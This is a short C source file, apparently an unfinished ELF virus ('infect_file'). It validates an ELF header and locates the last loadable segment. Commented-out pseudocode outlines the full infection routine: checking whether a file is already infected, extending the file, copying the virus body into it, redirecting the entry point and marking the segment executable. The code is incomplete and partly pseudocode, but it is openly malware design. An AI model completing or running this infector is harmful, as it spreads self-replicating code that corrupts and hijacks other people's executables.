
#include "head.h"

// uint8_t	check_if_not_infected(uint8_t *cave_self, unit8_t *cave_new)
// {
// 	count = 0;
// 	for i in range(VIRUS_SIZE):
// 		if cave_self[i] == cave_new[i]:
// 			count += 1;
// 	if ((float)count / (float)VIRUS_SIZE > 0.9)
// 		return TRUE;
// 	return FALSE;
// }

// void *extend_memory(file, file_size, phdr, VIRUS_SIZE)
// {

// 	int space_available = file_size - (phdr->offset + phdr->size);
// 	int space_missing = space_available - VIRUS_SIZE;
// 	if space_missing < 0:
// 		new_file = mmap(space_missing);
// 		memcopy(new_file, file, file_size);
// 	return new_file;
// }

uint8_t	*infect_file(void *file, size_t file_size, void *start_virus)
{
	printf("%s\n", __func__);
	(void)start_virus;
	if (check_elf_header(file, file_size) == FAILURE)
		return NULL;
	printf("ELF Hdr is OK\n");
	// Check if file is good, and find last loadable segment
	Elf64_Phdr *phdr = find_phdr(file, file_size);
	if (phdr == NULL)
		return NULL;
	// // Check if file already taken care of
	// if (check_if_not_infected(start_virus, phdr + phdr->offset - VIRUS_SIZE))
	// 	return NULL;
	// // Extend file size if necessary
	// file = extend_memory(file, file_size, phdr, VIRUS_SIZE);
	// if (file == NULL)
	// 	return NULL;
	// // Find again the phdr
	// elfphdr *phdr = find_phdr(file, file_size);
	// // Inject self in file
	// spot = file + (phdr->offset + phdr->size);
	// memcopy(spot, start_virus, VIRUS_SIZE);
	// file->e_entry = spot;
	// phdr->rights += EXECUTE;
	// phdr->size += VIRUS_SIZE;
	return file;
}